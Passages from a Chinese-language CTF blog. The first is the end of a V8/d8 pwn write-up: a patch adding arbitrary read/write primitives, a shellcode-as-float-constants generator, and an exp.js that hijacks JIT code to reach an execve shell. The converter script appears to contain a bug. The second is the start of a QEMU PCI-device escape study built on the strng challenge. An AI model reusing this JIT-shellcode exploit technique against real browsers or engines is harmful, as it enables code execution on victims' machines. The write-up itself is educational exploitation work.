v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; info) &#123;</span></span><br><span class="line"><span class="addition">+       Isolate *isolate = info.GetIsolate();</span></span><br><span class="line"><span class="addition">+       if (info.Length() != 2) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Need exactly 2 arguments&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg1 = Utils::OpenHandle(*info[0]);</span></span><br><span class="line"><span class="addition">+       internal::Handle&lt;internal::Object&gt; arg2 = Utils::OpenHandle(*info[1]);</span></span><br><span class="line"><span class="addition">+       if (!IsNumber(*arg1) || !IsNumber(*arg2)) &#123;</span></span><br><span class="line"><span class="addition">+               isolate-&gt;ThrowError(&quot;Arguments should be numbers&quot;);</span></span><br><span class="line"><span class="addition">+               return;</span></span><br><span class="line"><span class="addition">+       &#125;</span></span><br><span class="line"><span class="addition">+       internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</span></span><br><span class="line"><span class="addition">+       internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</span></span><br><span class="line"><span class="addition">+       uint32_t addr = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg1));</span></span><br><span class="line"><span class="addition">+       uint32_t value = static_cast&lt;uint32_t&gt;(internal::Object::NumberValue(*arg2));</span></span><br><span class="line"><span class="addition">+       uint64_t full_addr = base_addr + (uint64_t)addr;</span></span><br><span class="line"><span class="addition">+       *(uint32_t *)full_addr = value;</span></span><br><span class="line"><span class="addition">+&#125;</span></span><br><span class="line"><span class="addition">+</span></span><br><span class="line"> void Shell::ModuleResolutionSuccessCallback(</span><br><span class="line">     const FunctionCallbackInfo&lt;Value&gt;&amp; info) &#123;</span><br><span class="line">   DCHECK(i::ValidateCallbackInfo(info));</span><br><span class="line"><span class="meta">@@ -3364,7 +3422,13 @@</span> Local&lt;FunctionTemplate&gt; Shell::CreateNodeTemplates(</span><br><span class="line"> </span><br><span class="line"> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   Local&lt;ObjectTemplate&gt; global_template = ObjectTemplate::New(isolate);</span><br><span class="line"><span class="deletion">-  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;GetAddressOf&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, GetAddressOf));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;ArbRead32&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ArbRead32));</span></span><br><span class="line"><span class="addition">+  global_template-&gt;Set(isolate, &quot;ArbWrite32&quot;,</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ArbWrite32));</span></span><br><span class="line"><span class="addition">+/*  global_template-&gt;Set(Symbol::GetToStringTag(isolate),</span></span><br><span class="line">                        String::NewFromUtf8Literal(isolate, &quot;global&quot;));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;version&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, Version));</span><br><span class="line"><span class="meta">@@ -3385,13 +3449,13 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;readline&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, ReadLine));</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;load&quot;,</span><br><span class="line"><span class="deletion">-                       FunctionTemplate::New(isolate, ExecuteFile));</span></span><br><span class="line"><span class="addition">+                       FunctionTemplate::New(isolate, ExecuteFile));*/</span></span><br><span class="line">   global_template-&gt;Set(isolate, &quot;setTimeout&quot;,</span><br><span class="line">                        FunctionTemplate::New(isolate, SetTimeout));</span><br><span class="line">   // Some Emscripten-generated code tries to call &#x27;quit&#x27;, which in turn would</span><br><span class="line">   // call C&#x27;s exit(). This would lead to memory leaks, because there is no way</span><br><span class="line">   // we can terminate cleanly then, so we need a way to hide &#x27;quit&#x27;.</span><br><span class="line"><span class="deletion">-  if (!options.omit_quit) &#123;</span></span><br><span class="line"><span class="addition">+/*  if (!options.omit_quit) &#123;</span></span><br><span class="line">     global_template-&gt;Set(isolate, &quot;quit&quot;, FunctionTemplate::New(isolate, Quit));</span><br><span class="line">   &#125;</span><br><span class="line">   global_template-&gt;Set(isolate, &quot;testRunner&quot;,</span><br><span class="line"><span class="meta">@@ -3410,7 +3474,7 @@</span> Local&lt;ObjectTemplate&gt; Shell::CreateGlobalTemplate(Isolate* isolate) &#123;</span><br><span class="line">   if (i::v8_flags.expose_async_hooks) &#123;</span><br><span class="line">     global_template-&gt;Set(isolate, &quot;async_hooks&quot;,</span><br><span class="line">                          Shell::CreateAsyncHookTemplate(isolate));</span><br><span class="line"><span class="deletion">-  &#125;</span></span><br><span class="line"><span class="addition">+  &#125;*/</span></span><br><span class="line"> </span><br><span class="line">   return global_template;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="comment">diff --git a/src/d8/d8.h b/src/d8/d8.h</span></span><br><span class="line"><span class="comment">index a19d4a0eae4..476675a7150 100644</span></span><br><span class="line"><span class="comment">--- a/src/d8/d8.h</span></span><br><span class="line"><span class="comment">+++ b/src/d8/d8.h</span></span><br><span class="line"><span class="meta">@@ -507,6 +507,9 @@</span> class Shell : public i::AllStatic &#123;</span><br><span class="line">   &#125;;</span><br><span class="line">   enum class CodeType &#123; kFileName, kString, kFunction, kInvalid, kNone &#125;;</span><br><span class="line"> </span><br><span class="line"><span class="addition">+  static void GetAddressOf(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line"><span class="addition">+  static void ArbRead32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line"><span class="addition">+  static void ArbWrite32(const v8::FunctionCallbackInfo&lt;v8::Value&gt;&amp; args);</span></span><br><span class="line">   static bool ExecuteString(Isolate* isolate, Local&lt;String&gt; source,</span><br><span class="line">                             Local&lt;String&gt; name,</span><br><span class="line">                             ReportExceptions report_exceptions,</span><br></pre></td></tr></table></figure>

<p>看懂上面代码需要了解一些关键的v8引擎原理：</p>
<ul>
<li><p>将C++函数暴露给JavaScript(一种方式)：<code>global_template-&gt;Set(isolate, &quot;ArbWrite32&quot;,FunctionTemplate::New(isolate, ArbWrite32));</code>实现<strong>JS 名称到 C++ 函数的映射</strong>，同时对应函数的实现参数与返回需要调用v8对应的api</p>
</li>
<li><p><code>v8::Isolate* isolate = info.GetIsolate();</code>从参数中的v8回调对象中得到isolate(V8 的<strong>沙箱和资源管理单元</strong>)，作为所有 V8 操作的<strong>核心上下文和资源容器</strong></p>
</li>
<li><p><strong>指针压缩技术</strong>: V8 启用了指针压缩（Pointer Compression）机制。该机制下，堆对象的地址并不是完整的 64 位地址，而是相对于 cage base 的 32 位偏移量，然后再将32位压缩基址转换为64位完整地址。需要用</p>
<p>  <code>internal::PtrComprCageBase cage_base = internal::GetPtrComprCageBase();</code></p>
<p>  <code>internal::Address base_addr = internal::V8HeapCompressionScheme::GetPtrComprCageBaseAddress(cage_base);</code>来获得V8堆在进程地址空间中的<strong>起始地址</strong>（64位值）</p>
</li>
</ul>
<p>实现的功能其实就是核心的两大原语:任意地址读➕任意地址写，以及一个获得对象在进程中的地址</p>
<p>假若在一个c语言写的程序中，我拿到这三个功能那么getshell的思路也就很多了。但是这是js程序中的功能，还没有那么直接简单。首先在题目的v8版本下，<code>MAGLEV compilation</code>机制会为多次重复的函数分配一段具有rwx的区域(并不是所有v8版本都是这样)。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">// 触发了MAGLEV的行为：</span><br><span class="line">1. 分配RWX内存页（为了性能，避免权限切换）</span><br><span class="line">2. 生成机器代码直接写入RWX页</span><br><span class="line">3. 将常量数据（包括浮点数）**内联嵌入**到代码中</span><br><span class="line">4. 立即执行，无需mprotect()调用</span><br></pre></td></tr></table></figure>

<p>那么基本思路就是在函数中嵌入getshell(以常量数据形式出现)的payload，在exp.js中反复调用对应函数使对应函数，使函数对应的机器码被分配到rwx的区域中。修改指针指向shellcode。</p>
<p>1.如何获得shellcode地址？</p>
<p>在js中，函数对象的地址并不是直接指向机器码，而是一个结构体。想要获得函数真实对应的机器码需要<strong>三级跳转</strong>：函数对象 → CodeDataContainer → instruction_start(常量的地址)</p>
<p>其中每一层跳转都需要找到相应的偏移(后者是前者的结构体成员)。</p>
<p>2.如何劫持程序流？</p>
<p>既然已经知道intruction_start指向函数机器码的开始，理所当然的劫持code结构体中的instruction_start成员为shellcode地址就可以执行shellcode了</p>
<p>3.怎么存shellcode？</p>
<p>一般选择 <strong>Float64数组（双精度浮点数）</strong></p>
<ul>
<li><p><strong>8字节对齐</strong>：正好是x64指令的自然大小</p>
</li>
<li><p><strong>IEEE 754标准</strong>：精确的二进制表示</p>
</li>
<li><p><strong>MAGLEV友好</strong>：浮点常量常被嵌入代码段</p>
</li>
<li><p><strong>无类型混淆</strong>：纯浮点数，V8优化简单</p>
</li>
</ul>
<p>不过需要注意由于<strong>浮点数是八字节的表示形式</strong> ，去掉<strong>前面两个字节的操作</strong> ，<strong>剩下的六个字节就是我们可控的内容</strong> ，然后为了能写成<code>rop</code>的形式，所以<code>6个字节</code>里要已<code>jmp</code>结尾，用来跳到下一个<code>gadget片段</code>，所以我们每一个<code>gadget</code>可以写<strong>四字节的内容+一个jmp</strong></p>
<p>Shellcode_generator:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>)</span><br><span class="line"></span><br><span class="line">jmp = <span class="string">b&quot;\xeb\x0c&quot;</span> <span class="comment">#jump rip+0xc</span></span><br><span class="line">shell_str = <span class="number">0x67616c66746163</span> <span class="comment">#catflag</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">make_double</span>(<span class="params">code</span>):</span><br><span class="line">	<span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">6</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">6</span>,<span class="string">b&quot;\x90&quot;</span>)+jmp))[<span class="number">2</span>:]) <span class="comment">#前两字节是0x90(不可控字节)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#execve(&quot;/bin/sh&quot;, NULL, NULL)</span></span><br><span class="line">make_double(asm(<span class="string">&quot;mov    eax, 0x67616c&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;mov    ebx, 0x66746163&quot;</span>))</span><br><span class="line">make_double(asm(<span class="string">&quot;shl rax,0x20&quot;</span>))<span class="comment">#左移32位，eax内数值作为高32位</span></span><br><span class="line">make_double(asm(<span class="string">&quot;add rax,rbx;push rax;&quot;</span>))<span class="comment">#ebx内容作为低32位</span></span><br><span class="line">make_double(asm(<span class="string">&quot;mov rdi, rsp;xor esi, esi;&quot;</span>))</span><br><span class="line">code = asm(<span class="string">&quot;xor edx,edx;push 0x3b;pop rax;syscall&quot;</span>)</span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">len</span>(code) &lt;= <span class="number">8</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(u64(code.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x90&#x27;</span>)))[<span class="number">2</span>:])</span><br></pre></td></tr></table></figure>

<p>js_tranlater:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">convert</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="keyword">const</span> shellcode=[<span class="number">0xceb900067616cb8n</span>,</span><br><span class="line"><span class="number">0xceb9066746163bbn</span>,</span><br><span class="line"><span class="number">0xceb909020e0c148n</span>,</span><br><span class="line"><span class="number">0xceb909050d80148n</span>,</span><br><span class="line"><span class="number">0xceb90f631e78948n</span>,</span><br><span class="line"><span class="number">0x90050f583b6ad231n</span></span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">const</span> floatshellcode=[];</span><br><span class="line">  <span class="keyword">const</span> buffer=<span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">8</span>);</span><br><span class="line">  <span class="keyword">const</span> dataview=<span class="keyword">new</span> <span class="title class_">DataView</span>(buffer);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">const</span> i <span class="keyword">of</span> shellcode)&#123;</span><br><span class="line">    dataview.<span class="title function_">setBigUint64</span>(<span class="number">0</span>,<span class="title class_">Int16Array</span>,<span class="literal">true</span>);</span><br><span class="line">    <span class="keyword">const</span> float=dataview.<span class="title function_">getFloat64</span>(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">    floatshellcode.<span class="title function_">push</span>(float);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> floatshellcode;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> shellcode=<span class="title function_">convert</span>();</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;const shellcode = () =&gt; &#123;return [&quot;</span>);</span><br><span class="line">shellcode.<span class="title function_">forEach</span>(<span class="function">(<span class="params">num, index</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`    <span class="subst">$&#123;num&#125;</span><span class="subst">$&#123;index &lt; shellcode.length - <span class="number">1</span> ? <span class="string">&#x27;,&#x27;</span> : <span class="string">&#x27;&#x27;</span>&#125;</span>`</span>);</span><br><span class="line">&#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;];&#125;&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>Exp.js:</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">shellcode</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> [</span><br><span class="line">    <span class="number">1.97102559442867765997e-246</span>,</span><br><span class="line">    <span class="number">1.97113694948983498454e-246</span>,</span><br><span class="line">    <span class="number">1.97118242283720987770e-246</span>,</span><br><span class="line">    <span class="number">1.97118262728646853415e-246</span>,</span><br><span class="line">    <span class="number">1.97129379506143829454e-246</span>,</span><br><span class="line">    -<span class="number">1.69562758796691328788e-231</span></span><br><span class="line">];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">debug</span>(<span class="params">str,val</span>)&#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;[+] &quot;</span>+ str + <span class="string">&quot;: &quot;</span> + <span class="string">&quot;0x&quot;</span> + <span class="title function_">hex</span>(val));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i=<span class="number">0</span>;i&lt;<span class="number">10000</span>;i++)</span><br><span class="line">    <span class="title function_">shellcode</span>(); <span class="comment">//触发MAGLEV </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">let</span> shellcode_addr=<span class="title class_">GetAddressOf</span>(shellcode);</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;function address:&quot;</span>,shellcode_addr);</span><br><span class="line"><span class="keyword">let</span> code_addr = <span class="title function_">unptr</span>(<span class="title class_">ArbRead32</span>(shellcode_addr + <span class="number">0xc</span>));</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;code address:&quot;</span>,code_addr);</span><br><span class="line"><span class="keyword">let</span> instruction_start_addr = code_addr + <span class="number">0x14</span>;</span><br><span class="line"><span class="keyword">let</span> shellcode_start = <span class="title class_">ArbRead32</span>(instruction_start_addr)+<span class="number">0x6b</span>;</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;instruction_start address: &quot;</span>,instruction_start_addr);</span><br><span class="line"><span class="title function_">debug</span>(<span class="string">&quot;shellcode_start with:&quot;</span>,shellcode_start);</span><br><span class="line"><span class="title function_">shellcode</span>();</span><br></pre></td></tr></table></figure>


      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="http://example.com/2025/12/13/qemu%E8%99%9A%E6%8B%9F%E5%8C%96%E5%88%9D%E6%8E%A2%E7%B4%A2/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="no_t1me">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="No_t1me's blog">
      <meta itemprop="description" content="逝者如斯夫，不舍昼夜">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content=" | No_t1me's blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2025/12/13/qemu%E8%99%9A%E6%8B%9F%E5%8C%96%E5%88%9D%E6%8E%A2%E7%B4%A2/" class="post-title-link" itemprop="url">qemu逃逸初探索</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">发表于</span>

      <time title="创建时间：2025-12-13 15:23:44" itemprop="dateCreated datePublished" datetime="2025-12-13T15:23:44+08:00">2025-12-13</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar-check"></i>
      </span>
      <span class="post-meta-item-text">更新于</span>
      <time title="修改时间：2025-12-25 13:31:12" itemprop="dateModified" datetime="2025-12-25T13:31:12+08:00">2025-12-25</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>貌似已经很久很久没有更新了。。。。。主要在搞学业上的一些汇报以及大作业还有期末，中间陆续会写几道pwn题，但是博客实在是没有精力写了。</p>
<p>最近接触了qemu虚拟化相关的一些知识，打算记录一下自己对于qemu容器借助有漏洞的pci设备来逃逸的一些学习过程，本博客记录了笔者从这方面完全一头雾水到初步理解（大概？</p>
<h3 id="qemu中pci设备使用mmio通信步骤"><a href="#qemu中pci设备使用mmio通信步骤" class="headerlink" title="qemu中pci设备使用mmio通信步骤"></a>qemu中pci设备使用mmio通信步骤</h3><p>这里用blizzardctf2017的strng设备实现来分析</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">pci_strng_realize</span><span class="params">(PCIDevice *pdev, Error **errp)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = DO_UPCAST(STRNGState, pdev, pdev);</span><br><span class="line"></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;mmio, OBJECT(strng), &amp;strng_mmio_ops, strng, <span class="string">&quot;strng-mmio&quot;</span>, STRNG_MMIO_SIZE);<span class="comment">//将MemoryRegion区域初始化</span></span><br><span class="line">    pci_register_bar(pdev, <span class="number">0</span>, PCI_BASE_ADDRESS_SPACE_MEMORY, &amp;strng-&gt;mmio);<span class="comment">//将已经初始化好的 &amp;strng-&gt;mmio 注册到PCI系统中    PCI配置空间中的BAR0会被设置，guest OS可以分配地址给它</span></span><br><span class="line">    memory_region_init_io(&amp;strng-&gt;pmio, OBJECT(strng), &amp;strng_pmio_ops, strng, <span class="string">&quot;strng-pmio&quot;</span>, STRNG_PMIO_SIZE);</span><br><span class="line">    pci_register_bar(pdev, <span class="number">1</span>, PCI_BASE_ADDRESS_SPACE_IO, &amp;strng-&gt;pmio);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在初始化完毕后，内存访问的流程如下：</p>
<blockquote>
<p>Guest OS内存访问<br>    ↓<br>QEMU内存子系统<br>    ↓<br>查找对应的MemoryRegion → 找到 &amp;strng-&gt;mmio<br>    ↓<br>调用 strng_mmio_ops 中的回调函数<br>    ↓<br>执行具体的设备模拟操作</p>
</blockquote>
<p>当GuestOS访问到mmio_base_address到mmio_base_address+STRNG_MMIO_SIZE的范围内的内存时会调用&amp;strng_mmio_ops结构体中对应的指针：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> MemoryRegionOps strng_mmio_ops = &#123;</span><br><span class="line">    .read = strng_mmio_read,</span><br><span class="line">    .write = strng_mmio_write,</span><br><span class="line">    .endianness = DEVICE_NATIVE_ENDIAN,</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//这里着重分析一下回调函数的参数：</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">1.void *opaque</span></span><br><span class="line"><span class="comment">不透明指针，实际上是 strng（设备状态）</span></span><br><span class="line"><span class="comment">在 memory_region_init_io() 中设置为 strng</span></span><br><span class="line"><span class="comment">在回调函数中需要转型：STRNGState *strng = opaque;</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">2.hwaddr addr</span></span><br><span class="line"><span class="comment">写入的偏移地址（相对于MMIO基地址）</span></span><br><span class="line"><span class="comment">比如guest写入 mmio_base + 0x10，这里 addr = 0x10</span></span><br><span class="line"><span class="comment">类型 hwaddr 通常等同于 uint64_t</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">3.uint64_t value（write）</span></span><br><span class="line"><span class="comment">要写入的值</span></span><br><span class="line"><span class="comment">这是最关键的参数，包含了guest要写入的数据</span></span><br><span class="line"><span class="comment">即使写入小于64位的数据，也使用这个参数传递</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">4.unsigned size</span></span><br><span class="line"><span class="comment">写入操作的数据宽度（字节数）</span></span><br><span class="line"><span class="comment">可能的值：1（byte）、2（word）、4（dword）、8（qword）</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="type">static</span> <span class="type">uint64_t</span> <span class="title function_">strng_pmio_read</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint64_t</span> val = ~<span class="number">0ULL</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        val = strng-&gt;addr;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span> val;</span><br><span class="line"></span><br><span class="line">        val = strng-&gt;regs[strng-&gt;addr &gt;&gt; <span class="number">2</span>];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> val;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">void</span> <span class="title function_">strng_pmio_write</span><span class="params">(<span class="type">void</span> *opaque, hwaddr addr, <span class="type">uint64_t</span> val, <span class="type">unsigned</span> size)</span></span><br><span class="line">&#123;</span><br><span class="line">    STRNGState *strng = opaque;</span><br><span class="line">    <span class="type">uint32_t</span> saddr;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (size != <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">switch</span> (addr) &#123;</span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_ADDR:</span><br><span class="line">        strng-&gt;addr = val;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">case</span> STRNG_PMIO_DATA:</span><br><span class="line">        <span class="keyword">if</span> (strng-&gt;addr &amp; <span class="number">3</span>)</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        saddr = strng-&gt;addr &gt;&gt; <span class="number">2</span>;</span><br><span class="line">        <span class="keyword">switch</span> (saddr) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            strng-&gt;srand(val);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand();</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = strng-&gt;rand_r(&amp;strng-&gt;regs[<span class="number">2</span>]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            strng-&gt;regs[saddr] = val;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

